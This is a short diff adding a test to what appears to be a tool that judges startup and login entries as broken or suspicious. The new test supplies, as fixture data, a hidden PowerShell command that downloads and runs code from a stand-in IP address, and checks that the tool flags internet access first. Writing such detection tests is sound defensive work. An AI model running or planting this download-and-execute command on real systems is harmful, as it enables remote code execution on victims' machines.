@@ -191,3 +191,10 @@ def test_missing_program_on_macos_is_broken(monkeypatch):
     monkeypatch.setattr(sm, "_exists", lambda path: True)
     (entry,) = sm.launchd_entries(files, "Al iniciar sesión", "x", "sistema", None)
     assert entry.exists is True and judge.judge(entry).verdict != BROKEN
+
+
+def test_the_red_flag_is_the_first_reason():
+    entry = judge.judge(e(command="powershell -w hidden -c iex(iwr http://198.51.100.7/a)", exists=True,
+                          path=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+                          signature="válida", signer="Microsoft Windows"))  # fmt: skip
+    assert "internet" in entry.reasons[0]
